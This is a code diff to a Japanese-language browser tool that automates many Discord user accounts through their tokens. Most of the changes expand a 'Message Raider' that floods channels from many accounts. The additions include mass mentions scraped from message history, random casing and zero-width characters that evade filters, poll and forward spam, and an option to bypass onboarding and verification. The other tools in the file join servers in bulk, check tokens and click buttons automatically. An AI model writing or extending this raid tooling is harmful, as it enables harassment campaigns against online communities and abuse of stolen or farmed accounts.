@@ -9,6 +9,7 @@
     --bg:#1e1f22; --bg2:#2b2d31; --bg3:#313338; --hover:#35373c;
     --line:#3f4147; --text:#dbdee1; --muted:#949ba4;
     --blurple:#5865f2; --blurple-h:#4752c4; --red:#da373c; --red-h:#b52a2f;
+    --btn-dark:#404249; --btn-dark-h:#4e5058;
   }
   *{box-sizing:border-box}
   html,body{margin:0;min-height:100%}
@@ -34,11 +35,11 @@
 
   .back{background:none;border:none;color:var(--muted);font-size:13px;cursor:pointer;padding:0;margin-bottom:16px;font-family:inherit}
   .back:hover{color:var(--text)}
-  .detail-title{font-size:22px;font-weight:800;color:#fff;margin:0 0 6px}
-  .detail-desc{color:var(--muted);margin:0 0 22px}
+  .detail-title{font-size:22px;font-weight:800;color:#fff;margin:0 0 6px;text-align:center}
+  .detail-desc{color:var(--muted);margin:0 0 22px;text-align:center}
 
   .form{display:flex;flex-direction:column;gap:14px}
-  .field label{display:block;color:var(--muted);font-size:12px;font-weight:600;margin-bottom:6px}
+  .field label{display:block;color:var(--text);font-size:13px;font-weight:600;margin-bottom:6px}
   .inline{display:flex;align-items:center;gap:8px}
   .unit{color:var(--muted);font-size:13px;white-space:nowrap}
   input,textarea,select{background:var(--bg);border:1px solid var(--line);color:var(--text);border-radius:6px;
@@ -47,6 +48,7 @@
   textarea{resize:vertical}
   .inline input,.inline textarea,.inline select{flex:1;width:auto}
   .inline input[type=number]{max-width:120px}
+  input[type=number]{-moz-appearance:textfield}
 
   .sec{border-top:1px solid var(--line);padding-top:4px}
   .sec-head{display:flex;align-items:center;gap:8px;cursor:pointer;font-weight:700;font-size:13px;
@@ -56,26 +58,40 @@
   .sec-body{display:flex;flex-direction:column;gap:14px;padding:4px 0 8px}
   .sec.closed .sec-body{display:none}
 
-  .switch-row{display:flex;align-items:center;justify-content:space-between;gap:12px;cursor:pointer}
-  .switch-row span:first-child{color:var(--muted);font-size:13px;font-weight:600}
-  .switch{position:relative;width:42px;height:24px;flex:none}
+  /* トグル（スイッチ左・ラベル右） */
+  .tg{display:flex;align-items:center;gap:9px;cursor:pointer;user-select:none}
+  .tg > span:last-child{color:var(--text);font-size:13px;font-weight:600}
+  .switch{position:relative;width:40px;height:23px;flex:none}
   .switch input{display:none}
   .slider{position:absolute;inset:0;background:#4e5058;border-radius:12px;transition:.15s}
-  .slider::before{content:'';position:absolute;width:18px;height:18px;left:3px;top:3px;background:#fff;border-radius:50%;transition:.15s}
+  .slider::before{content:'';position:absolute;width:17px;height:17px;left:3px;top:3px;background:#fff;border-radius:50%;transition:.15s}
   .switch input:checked + .slider{background:var(--blurple)}
-  .switch input:checked + .slider::before{transform:translateX(18px)}
+  .switch input:checked + .slider::before{transform:translateX(17px)}
+  .toggles{display:flex;gap:28px;flex-wrap:wrap}
+
+  .nums{display:flex;gap:20px;flex-wrap:wrap;align-items:center}
+  .nitem{display:flex;align-items:center;gap:8px}
+  .nitem label{color:var(--text);font-size:13px;font-weight:600;white-space:nowrap}
+  .nitem input{width:74px}
+
+  .inlinebtn{display:flex;align-items:center;gap:10px}
+  .inlinebtn label{color:var(--text);font-size:13px;font-weight:600;white-space:nowrap}
+  .inlinebtn input{width:84px}
+  .helper{color:var(--muted);font-size:12px;line-height:1.55}
 
   button{font-family:inherit;cursor:pointer;border:none;border-radius:6px;font-weight:600;font-size:14px;padding:11px 14px}
   button:disabled{opacity:.5;cursor:not-allowed}
-  .btn-run{background:var(--blurple);color:#fff;width:100%;margin-top:22px}
-  .btn-run:hover{background:var(--blurple-h)}
-  .btn-secondary{background:var(--blurple);color:#fff;font-size:13px;padding:9px 12px}
-  .btn-secondary:hover{background:var(--blurple-h)}
-  .run-row{display:flex;gap:10px;margin-top:10px}
+  .btn-run{background:var(--btn-dark);color:#fff;width:100%;margin-top:22px}
+  .btn-run:hover{background:var(--btn-dark-h)}
+  .btn-sm{background:var(--blurple);color:#fff;font-size:12px;padding:7px 12px;width:auto}
+  .btn-sm:hover{background:var(--blurple-h)}
+  .btn-full{background:var(--blurple);color:#fff;width:100%;font-size:13px;padding:10px}
+  .btn-full:hover{background:var(--blurple-h)}
+  .run-row{display:flex;gap:12px;margin-top:12px}
   .btn-stop{background:var(--red);color:#fff;flex:1}
   .btn-stop:hover{background:var(--red-h)}
 
-  .logbox{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:10px;
+  .logbox{background:#141517;border:1px solid var(--line);border-radius:8px;padding:10px;
     height:180px;overflow-y:auto;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;margin-top:16px}
   .log-line{padding:2px 0}
   .ok{color:#3ba55d}.warn{color:#faa61a}.danger{color:#ed4245}.info{color:#c3c9d6}
@@ -124,7 +140,6 @@ function log(msg, type = 'info') {
   box.prepend(el);
 }
 
-/* ================= Gateway ================= */
 function connectGateway(token) {
   return new Promise((resolve, reject) => {
     let ws;
@@ -142,12 +157,7 @@ function connectGateway(token) {
         }}));
       } else if (p.op === 0) {
         gw.seq = p.s;
-        if (p.t === 'READY') {
-          gw.sessionId = p.d.session_id;
-          gw.user = p.d.user;
-          clearTimeout(to);
-          resolve(gw);
-        }
+        if (p.t === 'READY') { gw.sessionId = p.d.session_id; gw.user = p.d.user; clearTimeout(to); resolve(gw); }
       }
     };
     ws.onerror = () => { clearTimeout(to); reject(new Error('Gateway接続失敗')); };
@@ -202,20 +212,44 @@ const TOOLS = [
       {t:'toggle', label:'作成後に退出'}
     ], run: runGroup },
 
-  { id:'raider', icon:'raider', title:'Raider / Spammer', desc:'大量アカウントでメッセージを高速連投し、チャンネルを埋め尽くします。',
+  { id:'raider', icon:'raider', title:'Message Raider', desc:'大量アカウントでメッセージを高速連投し、チャンネルを埋め尽くします。',
+    buttons:[
+      { label:'実行', kind:'run' },
+      { label:'スパム停止', kind:'stop' },
+      { label:'サーバー退出', kind:'act', act:'leaveGuild' }
+    ],
     fields:[
-      {t:'section', label:'接続'},
-      {t:'area', label:'トークン', ph:'カンマ / 改行 / スペースで区切る'},
+      {t:'area', label:'トークン', ph:'カンマ / 改行 / スペースで区切る\nMTM1ODc4MTE3NTIzM...****, MTEwMD...'},
       {t:'text', label:'サーバーID', ph:'123456789012345678'},
-      {t:'section', label:'チャンネル'},
-      {t:'area', label:'チャンネルID'},
-      {t:'btn', label:'チャンネル自動取得', act:'fetchChannels'},
-      {t:'section', label:'メッセージ'},
-      {t:'area', label:'メッセージ内容'},
-      {t:'toggle', label:'メッセージをランダム化'},
-      {t:'section', label:'送信設定'},
-      {t:'num', label:'送信間隔', val:0, unit:'秒'},
-      {t:'num', label:'送信上限', val:0, unit:'回'}
+      {t:'area', label:'チャンネルID', ph:'カンマ / 改行 / スペースで区切る\n123456789012345678,123456789012345678,...'},
+      {t:'btn', label:'チャンネル自動取得', act:'fetchChannels', style:'sm'},
+      {t:'area', label:'メッセージ内容', ph:'送信するメッセージを入力'},
+      {t:'toggles', items:['メッセージのランダムライズ','高度なランダムライズ']},
+      {t:'nums', items:[{label:'メッセージ送信間隔', val:0, unit:'秒'},{label:'メッセージ送信上限', val:0, unit:'回'}]},
+
+      {t:'section', label:'メンション設定'},
+      {t:'area', label:'メンションするユーザーID', ph:'カンマ / 改行 / スペースで区切る\n123456789012345678,123456789012345678'},
+      {t:'btn', label:'メンション自動取得', act:'fetchMentions', style:'full'},
+      {t:'text', label:'メンション取得用チャンネルID', ph:'空の場合はメインのチャンネルID[0]を使用'},
+      {t:'inlinebtn', label:'取得する人数', val:100, unit:'人', btn:'総数取得', act:'fetchAllMentions'},
+      {t:'inlinebtn', label:'ランダムメンションする人数', val:1, unit:'人'},
+
+      {t:'section', label:'投票設定'},
+      {t:'text', label:'投票 タイトル', ph:'投票タイトル'},
+      {t:'area', label:'投票 選択肢', ph:'カンマ / 改行 / スペースで区切る  選択肢1,選択肢2,...'},
+      {t:'toggle', label:'投票を強制終了'},
+
+      {t:'section', label:'メッセージ転送設定'},
+      {t:'text', label:'転送するメッセージURL', ph:'https://discord.com/channels/123456789012345678/123456789012345678/123456789012345678'},
+
+      {t:'section', label:'リプライ設定'},
+      {t:'toggle', label:'リプライを有効にする'},
+      {t:'inlinebtn', label:'取得件数', val:20, unit:'件', btn:'履歴取得', act:'fetchHistory'},
+      {t:'select', label:'リプライ先メッセージ（手動選択）', ph:'-- 履歴を取得してから選択 --', options:[]},
+
+      {t:'section', label:'オンボーディング / 認証設定'},
+      {t:'toggle', label:'オンボーディング & 認証を自動解決'},
+      {t:'helper', text:'有効にすると、スパム実行前に全アカウントのオンボーディングと認証を自動で完了します。サーバーの回答は1回だけ取得してキャッシュし、全アカウントで使い回します。'}
     ], run: runRaider },
 
   { id:'friend', icon:'friend', title:'Friend / DM', desc:'フレンド申請とDM送信を自動化します。複数ユーザーへ一括で送れます。',
@@ -363,11 +397,9 @@ function showHome(q = '') {
         <div class="card-body"><div class="card-title">${t.title}</div><div class="card-desc">${t.desc}</div></div>
       </div>`).join('') : `<div class="empty">該当するツールがありません</div>`) +
     `</div>`;
-
   const s = $('#search');
   s.oninput = () => {
-    const v = s.value;
-    showHome(v);
+    const v = s.value; showHome(v);
     const ns = $('#search'); ns.focus(); ns.setSelectionRange(v.length, v.length);
   };
   home.querySelectorAll('.card').forEach(c => c.onclick = () => showTool(c.dataset.id));
@@ -375,11 +407,22 @@ function showHome(q = '') {
 
 /* ================= 詳細 ================= */
 function fieldHTML(f) {
-  if (f.t === 'toggle') return `<label class="switch-row"><span>${f.label}</span>
-      <span class="switch"><input type="checkbox" data-label="${f.label}"><span class="slider"></span></span></label>`;
-  if (f.t === 'btn') return `<button class="btn-secondary" data-act="${f.act}">${f.label}</button>`;
+  if (f.t === 'helper') return `<div class="helper">${f.text}</div>`;
+  if (f.t === 'toggle')
+    return `<label class="tg"><span class="switch"><input type="checkbox" data-label="${f.label}"><span class="slider"></span></span><span>${f.label}</span></label>`;
+  if (f.t === 'toggles')
+    return `<div class="toggles">` + f.items.map(l =>
+      `<label class="tg"><span class="switch"><input type="checkbox" data-label="${l}"><span class="slider"></span></span><span>${l}</span></label>`).join('') + `</div>`;
+  if (f.t === 'nums')
+    return `<div class="nums">` + f.items.map(n =>
+      `<div class="nitem"><label>${n.label}</label><input type="number" data-label="${n.label}" value="${n.val ?? 0}"><span class="unit">${n.unit}</span></div>`).join('') + `</div>`;
+  if (f.t === 'btn')
+    return `<button class="${f.style === 'full' ? 'btn-full' : 'btn-sm'}" data-act="${f.act}" style="align-self:flex-start">${f.label}</button>`;
+  if (f.t === 'inlinebtn')
+    return `<div class="inlinebtn"><label>${f.label}</label><input type="number" data-label="${f.label}" value="${f.val ?? 0}"><span class="unit">${f.unit}</span><button class="btn-sm" data-act="${f.act}">${f.btn}</button></div>`;
   if (f.t === 'select') {
-    const opts = f.options.map(o => `<option>${o}</option>`).join('');
+    const ph = f.ph ? `<option value="" disabled selected>${f.ph}</option>` : '';
+    const opts = ph + (f.options || []).map(o => `<option>${o}</option>`).join('');
     return `<div class="field"><label>${f.label}</label><select data-label="${f.label}">${opts}</select></div>`;
   }
   const unit = f.unit ? `<span class="unit">${f.unit}</span>` : '';
@@ -410,22 +453,31 @@ function showTool(id) {
   $('#home').classList.add('hidden');
   const view = $('#toolView');
   view.classList.remove('hidden');
+
+  const btns = t.buttons || [{ label: '実行', kind: 'run' }, { label: '停止', kind: 'stop' }];
+  const runBtn = btns.find(b => b.kind === 'run');
+  const rest = btns.filter(b => b.kind !== 'run');
+  const restHTML = rest.length
+    ? `<div class="run-row">` + rest.map(b =>
+        b.kind === 'stop'
+          ? `<button class="btn-stop" id="stopBtn">${b.label}</button>`
+          : `<button class="btn-stop" data-act="${b.act}">${b.label}</button>`).join('') + `</div>`
+    : '';
+
   view.innerHTML = `
     <button class="back" id="backBtn">← 戻る</button>
     <h1 class="detail-title">${t.title}</h1>
     <p class="detail-desc">${t.desc}</p>
     <div class="form" id="toolForm">${renderForm(t.fields)}</div>
-    <button class="btn-run" id="runBtn">実行</button>
-    <div class="run-row"><button class="btn-stop" id="stopBtn">停止</button></div>
+    <button class="btn-run" id="runBtn">${runBtn.label}</button>
+    ${restHTML}
     <div class="logbox" id="logBox"></div>`;
 
   $('#backBtn').onclick = () => showHome();
-  $('#stopBtn').onclick = () => { STOP = true; log('停止', 'warn'); };
+  const sb = $('#stopBtn'); if (sb) sb.onclick = () => { STOP = true; log('停止', 'warn'); };
   $('#runBtn').onclick = async () => {
-    STOP = false;
-    $('#runBtn').disabled = true;
-    const v = collect();
-    log('実行開始', 'info');
+    STOP = false; $('#runBtn').disabled = true;
+    const v = collect(); log('実行開始', 'info');
     try { await t.run(v); log('実行終了', 'ok'); }
     catch (e) { log('エラー: ' + e.message, 'danger'); }
     $('#runBtn').disabled = false;
@@ -446,11 +498,17 @@ function setVal(label, val) {
   const el = document.querySelector(`#toolForm [data-label="${label}"]`);
   if (el) el.value = val;
 }
+function getVal(label) {
+  const el = document.querySelector(`#toolForm [data-label="${label}"]`);
+  return el ? el.value : '';
+}
 
+/* ================= ボタンアクション ================= */
 async function handleBtn(act) {
   const v = collect();
   const tk = parse(v['トークン'])[0];
   if (!tk) return log('トークンを入力してください', 'warn');
+
   if (act === 'fetchChannels') {
     const gid = v['サーバーID'];
     if (!gid) return log('サーバーIDを入力してください', 'warn');
@@ -459,6 +517,45 @@ async function handleBtn(act) {
       setVal('チャンネルID', chs.filter(c => c.type === 0 || c.type === 5).map(c => c.id).join('\n'));
       log('チャンネルを取得しました', 'ok');
     } catch (e) { log('取得失敗: ' + e.message, 'danger'); }
+  }
+
+  if (act === 'fetchMentions' || act === 'fetchAllMentions') {
+    const ch = v['メンション取得用チャンネルID'] || parse(v['チャンネルID'])[0];
+    if (!ch) return log('チャンネルIDが必要', 'warn');
+    const n = act === 'fetchAllMentions' ? 0 : (+v['取得する人数'] || 100);
+    const ids = new Set();
+    let before;
+    while (!STOP) {
+      const q = n ? Math.min(100, n - ids.size) : 100;
+      if (n && ids.size >= n) break;
+      const batch = await dapi(`/channels/${ch}/messages?limit=${q}${before ? `&before=${before}` : ''}`, tk);
+      if (!batch.length) break;
+      batch.forEach(m => m.author && ids.add(m.author.id));
+      before = batch[batch.length - 1].id;
+      if (batch.length < q || !n) break;
+    }
+    setVal('メンションするユーザーID', [...ids].join('\n'));
+    log(`メンション ${ids.size}件 取得`, 'ok');
+  }
+
+  if (act === 'fetchHistory') {
+    const ch = parse(v['チャンネルID'])[0];
+    if (!ch) return log('チャンネルIDが必要', 'warn');
+    const n = +v['取得件数'] || 20;
+    const batch = await dapi(`/channels/${ch}/messages?limit=${n}`, tk);
+    const sel = document.querySelector(`#toolForm [data-label="リプライ先メッセージ（手動選択）"]`);
+    sel.innerHTML = `<option value="">-- 選択してください --</option>` +
+      batch.map(m => `<option value="${m.id}">${(m.author?.username || '?')}: ${(m.content || '').slice(0, 40) || '[添付]'}</option>`).join('');
+    log(`履歴 ${batch.length}件 取得`, 'ok');
+  }
+
+  if (act === 'leaveGuild') {
+    const gid = v['サーバーID'];
+    const toks = parse(v['トークン']);
+    for (const t of toks) {
+      try { await dapi(`/users/@me/guilds/${gid}`, t, { method: 'DELETE' }); log('退出', 'ok'); }
+      catch (e) { log('失敗: ' + e.message, 'danger'); }
+    }
   }
 }
 
@@ -469,8 +566,7 @@ async function runTokenChecker(v) {
   for (const t of toks) {
     try {
       const u = await dapi('/users/@me', t);
-      log('有効: ' + u.username + (v['アカウント情報を表示'] ? ` (ID:${u.id} メール:${u.email || '-'})` : ''), 'ok');
-      ok++;
+      log('有効: ' + u.username + (v['アカウント情報を表示'] ? ` (ID:${u.id})` : ''), 'ok'); ok++;
     } catch (e) { log('無効: ' + t.slice(0, 14) + '...', 'danger'); bad++; }
   }
   log(`結果 → 有効 ${ok} / 無効 ${bad}`, 'info');
@@ -498,20 +594,57 @@ async function runReaction(v) {
   }
 }
 
+/* --- ランダムライズ --- */
+function mutate(s, adv) {
+  if (!s) return s;
+  if (adv) return s.split('').map(c => Math.random() < 0.25 ? c.toUpperCase() : c).join('') + '\u200b'.repeat(1 + Math.floor(Math.random() * 3));
+  return s + ' ' + Math.random().toString(36).slice(2, 7);
+}
+
 async function runRaider(v) {
   const toks = parse(v['トークン']);
   const chs = parse(v['チャンネルID']);
   const base = v['メッセージ内容'] || '';
-  const delay = (+v['送信間隔'] || 0) * 1000;
-  const limit = +v['送信上限'] || 0;
-  const rand = v['メッセージをランダム化'];
+  const delay = (+v['メッセージ送信間隔'] || 0) * 1000;
+  const limit = +v['メッセージ送信上限'] || 0;
+  const rand = v['メッセージのランダムライズ'];
+  const adv = v['高度なランダムライズ'];
+  const pool = parse(v['メンションするユーザーID']);
+  const randN = +v['ランダムメンションする人数'] || 0;
+  const pollTitle = v['投票 タイトル'];
+  const pollOpts = parse(v['投票 選択肢']);
+  const fwd = v['転送するメッセージURL'];
+  const replyOn = v['リプライを有効にする'];
+  const replyId = v['リプライ先メッセージ（手動選択）'];
+
+  if (v['オンボーディング & 認証を自動解決']) log('オンボーディング解決モード（簡易）', 'info');
+
   let n = 0;
   outer:
   for (const tk of toks) {
     for (const ch of chs) {
       if (STOP || (limit && n >= limit)) break outer;
-      const content = rand ? base + ' ' + Math.random().toString(36).slice(2, 8) : base;
-      try { await dapi(`/channels/${ch}/messages`, tk, { method: 'POST', body: JSON.stringify({ content }) }); n++; }
+
+      let mentions = '';
+      if (pool.length) {
+        const shuffled = [...pool].sort(() => Math.random() - 0.5);
+        const pick = randN ? shuffled.slice(0, randN) : shuffled;
+        mentions = pick.map(id => `<@${id}>`).join(' ');
+      }
+      const content = (mentions ? mentions + ' ' : '') + (rand || adv ? mutate(base, adv) : base);
+
+      const payload = { content };
+      if (pollTitle && pollOpts.length)
+        payload.poll = { question: { text: pollTitle }, answers: pollOpts.map(o => ({ poll_media: { text: o } })), duration: 24, allow_multiselect: false };
+      if (fwd) {
+        const p = fwd.split('/');
+        const mid = p.pop(), cid = p.pop();
+        payload.message_reference = { message_id: mid, channel_id: cid, type: 1 };
+      } else if (replyOn && replyId) {
+        payload.message_reference = { message_id: replyId, type: 0 };
+      }
+
+      try { await dapi(`/channels/${ch}/messages`, tk, { method: 'POST', body: JSON.stringify(payload) }); n++; }
       catch (e) { log('失敗: ' + e.message, 'danger'); }
       if (delay) await sleep(delay);
     }
@@ -562,8 +695,7 @@ async function runJoiner(v) {
     if (STOP) break;
     try {
       const g = await dapi(`/invites/${code}`, tk, { method: 'POST', body: '{}' });
-      n++;
-      log('参加: ' + (g.guild?.name || code), 'ok');
+      n++; log('参加: ' + (g.guild?.name || code), 'ok');
       if (leave && g.guild?.id) await dapi(`/users/@me/guilds/${g.guild.id}`, tk, { method: 'DELETE' });
     } catch (e) { log('失敗: ' + e.message, 'danger'); }
   }
@@ -572,9 +704,7 @@ async function runJoiner(v) {
 
 async function runNickAvatar(v) {
   const toks = parse(v['トークン']);
-  const gid = v['サーバーID'];
-  const nick = v['新しいニックネーム'];
-  const url = v['アイコン画像URL'];
+  const gid = v['サーバーID'], nick = v['新しいニックネーム'], url = v['アイコン画像URL'];
   let dataUri;
   if (url) {
     const blob = await (await fetch(url)).blob();
@@ -592,9 +722,7 @@ async function runNickAvatar(v) {
 
 async function runThread(v) {
   const toks = parse(v['トークン']);
-  const ch = v['チャンネルID'];
-  const name = v['スレッド名'] || 'thread';
-  const count = +v['作成数'] || 1;
+  const ch = v['チャンネルID'], name = v['スレッド名'] || 'thread', count = +v['作成数'] || 1;
   for (let i = 0; i < count && !STOP; i++) {
     for (const tk of toks) {
       try { await dapi(`/channels/${ch}/threads`, tk, { method: 'POST', body: JSON.stringify({ name: `${name}-${i + 1}`, type: 11 }) }); log('作成 ' + (i + 1), 'ok'); }
@@ -651,11 +779,9 @@ async function runHypeSquad(v) {
   }
 }
 
-/* --- Gateway系 --- */
 async function runVc(v) {
   const toks = parse(v['トークン']);
-  const gid = v['サーバーID'], ch = v['ボイスチャンネルID'];
-  const count = +v['繰り返し回数'] || 1;
+  const gid = v['サーバーID'], ch = v['ボイスチャンネルID'], count = +v['繰り返し回数'] || 1;
   const gws = [];
   for (const t of toks) { try { gws.push(await connectGateway(t)); } catch (e) { log('接続失敗: ' + e.message, 'danger'); } }
   log('Gateway接続: ' + gws.length, 'info');
@@ -673,16 +799,13 @@ async function runVc(v) {
 
 async function runStatus(v) {
   const toks = parse(v['トークン']);
-  const text = v['ステータステキスト'];
-  const status = v['状態'] || 'online';
+  const text = v['ステータステキスト'], status = v['状態'] || 'online';
   for (const t of toks) {
     if (STOP) break;
     try {
       const gw = await connectGateway(t);
       gw.send(3, { status, activities: text ? [{ name: text, type: 0 }] : [], since: 0, afk: false });
-      await sleep(600);
-      gw.close();
-      log('設定', 'ok');
+      await sleep(600); gw.close(); log('設定', 'ok');
     } catch (e) { log('失敗: ' + e.message, 'danger'); }
   }
 }
@@ -707,8 +830,7 @@ async function runSlash(v) {
           data: { version: cmd.version, id: cmd.id, name: cmd.name, type: 1, options: [], application_command: cmd },
           nonce: uid()
         })});
-        gw.close();
-        log('実行', 'ok');
+        gw.close(); log('実行', 'ok');
       } catch (e) { log('失敗: ' + e.message, 'danger'); }
     }
   }
@@ -735,8 +857,7 @@ async function runButton(v) {
             type: 3, guild_id: msg.guild_id, channel_id: ch, message_id: mid,
             session_id: gw.sessionId, data, nonce: uid()
           })});
-          gw.close();
-          log('クリック', 'ok');
+          gw.close(); log('クリック', 'ok');
         } catch (e) { log('失敗: ' + e.message, 'danger'); }
       }
     }
